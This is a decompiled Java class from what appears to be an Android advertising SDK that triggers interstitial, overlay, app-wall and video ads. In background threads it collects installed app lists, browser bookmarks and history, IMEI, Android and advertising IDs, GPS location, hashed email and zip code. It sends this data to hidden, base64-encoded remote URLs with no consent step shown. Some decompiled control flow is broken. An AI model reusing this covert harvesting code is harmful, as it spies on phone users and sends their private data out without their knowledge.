package com.eyqv.mwyc183555;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.provider.Browser;
import android.util.Log;
import android.webkit.WebSettings;
import android.webkit.WebView;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Date;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

class d
  implements g
{
  static JSONObject a;
  static List<NameValuePair> b;
  private static Context e;
  private static String f = "0";
  private static SharedPreferences g;
  a<String> c = new a()
  {
    public void a()
    {
      if (MA.isSDKEnabled(d.b())) {}
      try
      {
        new Thread(new Runnable()
        {
          public void run()
          {
            Object localObject2 = new StringBuilder();
            Object localObject1 = new StringBuilder();
            Object localObject3 = d.b().getPackageManager().getInstalledApplications(128).iterator();
            while (((Iterator)localObject3).hasNext())
            {
              Object localObject4 = (ApplicationInfo)((Iterator)localObject3).next();
              StringBuilder localStringBuilder;
              if (d.a(d.this, (ApplicationInfo)localObject4))
              {
                localStringBuilder = new StringBuilder();
                localStringBuilder.append("\"");
                localStringBuilder.append(((ApplicationInfo)localObject4).packageName);
                localStringBuilder.append("\"");
                localObject4 = localStringBuilder.toString();
                localStringBuilder = new StringBuilder();
                localStringBuilder.append((String)localObject4);
                localStringBuilder.append(",");
                ((StringBuilder)localObject1).append(localStringBuilder.toString());
              }
              else
              {
                localStringBuilder = new StringBuilder();
                localStringBuilder.append("\"");
                localStringBuilder.append(((ApplicationInfo)localObject4).packageName);
                localStringBuilder.append("\"");
                localObject4 = localStringBuilder.toString();
                localStringBuilder = new StringBuilder();
                localStringBuilder.append((String)localObject4);
                localStringBuilder.append(",");
                ((StringBuilder)localObject2).append(localStringBuilder.toString());
              }
            }
            localObject2 = ((StringBuilder)localObject2).toString();
            localObject1 = ((StringBuilder)localObject1).toString();
            localObject3 = new ArrayList();
            ((List)localObject3).add(new BasicNameValuePair("imei", Util.g()));
            ((List)localObject3).add(new BasicNameValuePair("imei_sha", Util.h()));
            ((List)localObject3).add(new BasicNameValuePair("android_id", Util.g(d.b())));
            ((List)localObject3).add(new BasicNameValuePair("android_id_sha", Util.h(d.b())));
            ((List)localObject3).add(new BasicNameValuePair("deviceUniqueness", Util.w()));
            ((List)localObject3).add(new BasicNameValuePair("user_apps", (String)localObject2));
            ((List)localObject3).add(new BasicNameValuePair("system_apps", (String)localObject1));
            if (Util.s(d.b())) {
              new Thread(new l(d.b(), d.this.c, (List)localObject3, "aHR0cHM6Ly9hcGkuYWlycHVzaC5jb20vbHAvbG9nX3Nka19yZXF1ZXN0LnBocA==", 30000L, false), "appd").start();
            }
          }
        }, "app").start();
        return;
      }
      catch (Exception localException) {}
    }
    
    public void a(String paramAnonymousString)
    {
      StringBuilder localStringBuilder = new StringBuilder();
      localStringBuilder.append("App info result: ");
      localStringBuilder.append(paramAnonymousString);
      Util.a(localStringBuilder.toString());
      if ((paramAnonymousString != null) && (!paramAnonymousString.equals(""))) {
        d.f(d.b());
      }
      if (Util.s(d.b())) {
        d.this.d.a();
      }
    }
  };
  a<String> d = new a()
  {
    public void a()
    {
      if (MA.isSDKEnabled(d.b())) {}
      for (;;)
      {
        try
        {
          localObject2 = d.b().getContentResolver().query(Browser.BOOKMARKS_URI, new String[] { "url", "date" }, null, null, null);
          localObject1 = new JSONArray();
          if (localObject2 != null) {
            if (((Cursor)localObject2).moveToFirst())
            {
              l = ((Cursor)localObject2).getLong(((Cursor)localObject2).getColumnIndex("date"));
              str = ((Cursor)localObject2).getString(((Cursor)localObject2).getColumnIndex("url"));
            }
          }
        }
        catch (Exception localException)
        {
          Object localObject2;
          Object localObject1;
          long l;
          String str;
          JSONObject localJSONObject;
          return;
        }
        try
        {
          localJSONObject = new JSONObject();
          localJSONObject.put("date", Util.b(Long.valueOf(l).longValue()));
          localJSONObject.put("url", str);
          ((JSONArray)localObject1).put(localJSONObject);
          if (((Cursor)localObject2).moveToNext()) {}
        }
        catch (JSONException localJSONException) {}
      }
      Util.a("error inlist");
      return;
      ((Cursor)localObject2).close();
      localObject2 = new ArrayList();
      ((List)localObject2).add(new BasicNameValuePair("imei", Util.g()));
      ((List)localObject2).add(new BasicNameValuePair("imei_sha", Util.h()));
      ((List)localObject2).add(new BasicNameValuePair("android_id", Util.g(d.b())));
      ((List)localObject2).add(new BasicNameValuePair("android_id_sha", Util.h(d.b())));
      ((List)localObject2).add(new BasicNameValuePair("deviceUniqueness", Util.w()));
      ((List)localObject2).add(new BasicNameValuePair("inputlist", ((JSONArray)localObject1).toString()));
      localObject1 = new StringBuilder();
      ((StringBuilder)localObject1).append("History Values >>>>>>: ");
      ((StringBuilder)localObject1).append(localObject2);
      Util.a(((StringBuilder)localObject1).toString());
      if (Util.s(d.b())) {
        new Thread(new l(d.b(), d.this.d, (List)localObject2, "aHR0cHM6Ly9hcGkuYWlycHVzaC5jb20vbmV3YWQvcmVwb3J0L2xvZ1VzZXJCcm93c2VySGlzdG9yeS5waHA=", 5000L, false), "browser").start();
      }
    }
    
    public void a(String paramAnonymousString)
    {
      StringBuilder localStringBuilder = new StringBuilder();
      localStringBuilder.append("History result: ");
      localStringBuilder.append(paramAnonymousString);
      Util.a(localStringBuilder.toString());
      if ((paramAnonymousString != null) && (!paramAnonymousString.equals(""))) {
        d.f(d.b());
      }
    }
  };
  
  public d(Context paramContext)
  {
    e = paramContext;
  }
  
  static List<NameValuePair> a(Context paramContext)
    throws NullPointerException, Exception
  {
    e = paramContext;
    b = new ArrayList();
    b.add(new BasicNameValuePair("APIKEY", Util.i()));
    b.add(new BasicNameValuePair("appId", Util.j()));
    b.add(new BasicNameValuePair("imei", Util.g()));
    b.add(new BasicNameValuePair("imei_sha", Util.h()));
    b.add(new BasicNameValuePair("token", f));
    b.add(new BasicNameValuePair("request_timestamp", Util.r()));
    b.add(new BasicNameValuePair("packageName", Util.i(e)));
    b.add(new BasicNameValuePair("version", Util.t()));
    b.add(new BasicNameValuePair("carrier", Util.j(e)));
    b.add(new BasicNameValuePair("networkOperator", Util.k(e)));
    b.add(new BasicNameValuePair("phoneModel", Util.s()));
    b.add(new BasicNameValuePair("manufacturer", Util.v()));
    b.add(new BasicNameValuePair("longitude", Util.m()));
    b.add(new BasicNameValuePair("latitude", Util.l()));
    b.add(new BasicNameValuePair("sdkversion", Util.a()));
    paramContext = b;
    Object localObject = new StringBuilder();
    ((StringBuilder)localObject).append("");
    ((StringBuilder)localObject).append(Util.l(e));
    paramContext.add(new BasicNameValuePair("wifi", ((StringBuilder)localObject).toString()));
    b.add(new BasicNameValuePair("useragent", Util.k()));
    b.add(new BasicNameValuePair("android_id", Util.g(e)));
    b.add(new BasicNameValuePair("android_id_sha", Util.h(e)));
    b.add(new BasicNameValuePair("screenSize", Util.o(e)));
    b.add(new BasicNameValuePair("deviceUniqueness", Util.w()));
    b.add(new BasicNameValuePair("networkSubType", Util.m(e)));
    b.add(new BasicNameValuePair("isTablet", String.valueOf(Util.b(e))));
    b.add(new BasicNameValuePair("SD", Util.q(e)));
    paramContext = b;
    localObject = new StringBuilder();
    ((StringBuilder)localObject).append("");
    ((StringBuilder)localObject).append(Util.n(e));
    paramContext.add(new BasicNameValuePair("isConnectionFast", ((StringBuilder)localObject).toString()));
    paramContext = b;
    localObject = new StringBuilder();
    ((StringBuilder)localObject).append("");
    ((StringBuilder)localObject).append(Util.u(e));
    paramContext.add(new BasicNameValuePair("unknownsource", ((StringBuilder)localObject).toString()));
    b.add(new BasicNameValuePair("appName", Util.t(e)));
    b.add(new BasicNameValuePair("dpi", Util.r(e)));
    b.add(new BasicNameValuePair("src", "inappbundled"));
    b.add(new BasicNameValuePair("sessionId", Util.e()));
    paramContext = b;
    localObject = new StringBuilder();
    ((StringBuilder)localObject).append("");
    ((StringBuilder)localObject).append(Util.x());
    paramContext.add(new BasicNameValuePair("language", ((StringBuilder)localObject).toString()));
    paramContext = b;
    localObject = new StringBuilder();
    ((StringBuilder)localObject).append("");
    ((StringBuilder)localObject).append(Locale.getDefault());
    paramContext.add(new BasicNameValuePair("locale", ((StringBuilder)localObject).toString()));
    b.add(new BasicNameValuePair("locProvider", Util.q()));
    b.add(new BasicNameValuePair("locType", Util.o()));
    paramContext = b;
    localObject = new StringBuilder();
    ((StringBuilder)localObject).append("");
    ((StringBuilder)localObject).append(Util.p());
    paramContext.add(new BasicNameValuePair("locAccuracy", ((StringBuilder)localObject).toString()));
    paramContext = b;
    localObject = new StringBuilder();
    ((StringBuilder)localObject).append("");
    ((StringBuilder)localObject).append(Util.c());
    paramContext.add(new BasicNameValuePair("adv_id", ((StringBuilder)localObject).toString()));
    paramContext = b;
    localObject = new StringBuilder();
    ((StringBuilder)localObject).append("");
    ((StringBuilder)localObject).append(Util.b());
    paramContext.add(new BasicNameValuePair("adOpt", ((StringBuilder)localObject).toString()));
    paramContext = Util.d(e);
    if ((paramContext != null) && (!paramContext.equals("")))
    {
      b.add(new BasicNameValuePair("email_md5", Util.m(paramContext)));
      b.add(new BasicNameValuePair("email_sha", Util.n(paramContext)));
    }
    try
    {
      paramContext = Util.p(e);
      localObject = b;
      StringBuilder localStringBuilder = new StringBuilder();
      localStringBuilder.append("");
      localStringBuilder.append(paramContext[0]);
      ((List)localObject).add(new BasicNameValuePair("country", localStringBuilder.toString()));
      localObject = b;
      localStringBuilder = new StringBuilder();
      localStringBuilder.append("");
      localStringBuilder.append(paramContext[1]);
      ((List)localObject).add(new BasicNameValuePair("zip", localStringBuilder.toString()));
      return b;
    }
    catch (NullPointerException|Exception paramContext)
    {
      for (;;) {}
    }
  }
  
  static void a(Activity paramActivity)
  {
    try
    {
      localObject = paramActivity.getSharedPreferences("eap", 0);
      paramActivity = new MA(paramActivity);
      if ((((SharedPreferences)localObject).contains("interstitialads")) && (((SharedPreferences)localObject).getBoolean("interstitialads", false))) {
        paramActivity.callSmartWallAd();
      }
      if ((((SharedPreferences)localObject).contains("overylayad")) && (((SharedPreferences)localObject).getBoolean("overylayad", false))) {
        paramActivity.callOverlayAd();
      }
      if ((((SharedPreferences)localObject).contains("appwall")) && (((SharedPreferences)localObject).getBoolean("appwall", false))) {
        paramActivity.callAppWall();
      }
      if ((((SharedPreferences)localObject).contains("videoad")) && (((SharedPreferences)localObject).getBoolean("videoad", false))) {
        paramActivity.callVideoAd();
      }
      if ((((SharedPreferences)localObject).contains("landingpagead")) && (((SharedPreferences)localObject).getBoolean("landingpagead", false))) {
        paramActivity.callLandingPageAd();
      }
      if ((((SharedPreferences)localObject).contains("rich_media")) && (((SharedPreferences)localObject).getBoolean("rich_media", false)))
      {
        paramActivity.displayRichMediaInterstitialAd();
        return;
      }
    }
    catch (Exception paramActivity)
    {
      Object localObject = new StringBuilder();
      ((StringBuilder)localObject).append("Error occured in eap: ");
      ((StringBuilder)localObject).append(paramActivity.getMessage());
      Util.b(((StringBuilder)localObject).toString());
    }
  }
  
  private boolean a(ApplicationInfo paramApplicationInfo)
  {
    return (paramApplicationInfo.flags & 0x1) != 0;
  }
  
  static boolean b(Context paramContext)
  {
    if (paramContext != null) {}
    boolean bool;
    try
    {
      g = null;
      g = paramContext.getSharedPreferences("next_ad_call", 0);
      paramContext = g.edit();
      l = 10000L + System.currentTimeMillis();
      paramContext.putLong("startTime", l);
      bool = paramContext.commit();
    }
    catch (Exception paramContext)
    {
      long l;
      for (;;) {}
    }
    try
    {
      paramContext = new StringBuilder();
      paramContext.append("Next Smart Wall ad call time: ");
      paramContext.append(new Date(l).toString());
      Log.i("BunSDK", paramContext.toString());
      return bool;
    }
    catch (Exception paramContext) {}
    return false;
    return bool;
  }
  
  static long c(Context paramContext)
  {
    g = null;
    long l2 = 0L;
    long l1 = l2;
    if (paramContext != null)
    {
      g = paramContext.getSharedPreferences("next_ad_call", 0);
      l1 = l2;
      if (g != null) {
        l1 = g.getLong("startTime", 0L);
      }
    }
    return l1;
  }
  
  static boolean d(Context paramContext)
  {
    try
    {
      g = null;
      g = paramContext.getSharedPreferences("video_ad_call", 0);
      paramContext = g.edit();
      long l = 30000L + System.currentTimeMillis();
      paramContext.putLong("startTime", l);
      StringBuilder localStringBuilder = new StringBuilder();
      localStringBuilder.append("Next Video ad ad call time: ");
      localStringBuilder.append(new Date(l).toString());
      Util.a(localStringBuilder.toString());
      boolean bool = paramContext.commit();
      return bool;
    }
    catch (Exception paramContext) {}
    return false;
  }
  
  static long e(Context paramContext)
  {
    g = null;
    long l2 = 0L;
    long l1 = l2;
    if (paramContext != null)
    {
      g = paramContext.getSharedPreferences("video_ad_call", 0);
      l1 = l2;
      if (g != null) {
        l1 = g.getLong("startTime", 0L);
      }
    }
    return l1;
  }
  
  static boolean f(Context paramContext)
  {
    if (paramContext != null)
    {
      g = null;
      g = paramContext.getSharedPreferences("app_list_data", 0);
      paramContext = g.edit();
      paramContext.putLong("startTime", System.currentTimeMillis() + 604800000L);
      return paramContext.commit();
    }
    Util.a("Unable to save app time data.");
    return false;
  }
  
  static long g(Context paramContext)
  {
    g = null;
    long l2 = 0L;
    long l1 = l2;
    if (paramContext != null)
    {
      g = paramContext.getSharedPreferences("app_list_data", 0);
      l1 = l2;
      if (g != null) {
        l1 = g.getLong("startTime", 0L);
      }
    }
    return l1;
  }
  
  static void h(Context paramContext)
  {
    try
    {
      paramContext = paramContext.getSharedPreferences("firstTime", 0).edit();
      paramContext.putBoolean("showDialog", false);
      paramContext.commit();
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  static boolean i(Context paramContext)
  {
    return paramContext.getSharedPreferences("firstTime", 0).getBoolean("showDialog", true);
  }
  
  void a()
  {
    for (;;)
    {
      try
      {
        Util.g(new WebView(e).getSettings().getUserAgentString());
        localObject1 = new p(e);
      }
      catch (Exception localException1)
      {
        Object localObject1;
        Object localObject2;
        continue;
      }
      try
      {
        localObject2 = ((p)localObject1).d();
        if (localObject2 != null)
        {
          Object localObject3 = new StringBuilder();
          ((StringBuilder)localObject3).append("");
          ((StringBuilder)localObject3).append(((Location)localObject2).getLatitude());
          localObject3 = ((StringBuilder)localObject3).toString();
          Object localObject4 = new StringBuilder();
          ((StringBuilder)localObject4).append("");
          ((StringBuilder)localObject4).append(((Location)localObject2).getLongitude());
          localObject4 = ((StringBuilder)localObject4).toString();
          Util.j(((p)localObject1).c());
          Util.a(((Location)localObject2).getAccuracy());
          Util.k(((Location)localObject2).getProvider());
          localObject2 = new StringBuilder();
          ((StringBuilder)localObject2).append("Location: lat ");
          ((StringBuilder)localObject2).append((String)localObject3);
          ((StringBuilder)localObject2).append(", lon ");
          ((StringBuilder)localObject2).append((String)localObject4);
          Util.a(((StringBuilder)localObject2).toString());
          Util.h((String)localObject3);
          Util.i((String)localObject4);
        }
        else
        {
          Util.a("Location null: ");
        }
      }
      catch (Exception localException2) {}
    }
    localObject2 = new StringBuilder();
    ((StringBuilder)localObject2).append(((p)localObject1).a());
    ((StringBuilder)localObject2).append("");
    ((StringBuilder)localObject2).append(Util.j());
    ((StringBuilder)localObject2).append("");
    ((StringBuilder)localObject2).append(Util.r());
    f = ((StringBuilder)localObject2).toString();
    localObject1 = MessageDigest.getInstance("MD5");
    ((MessageDigest)localObject1).update(f.getBytes(), 0, f.length());
    f = new BigInteger(1, ((MessageDigest)localObject1).digest()).toString(16);
    return;
    Util.a("Token conversion Error ");
  }
}
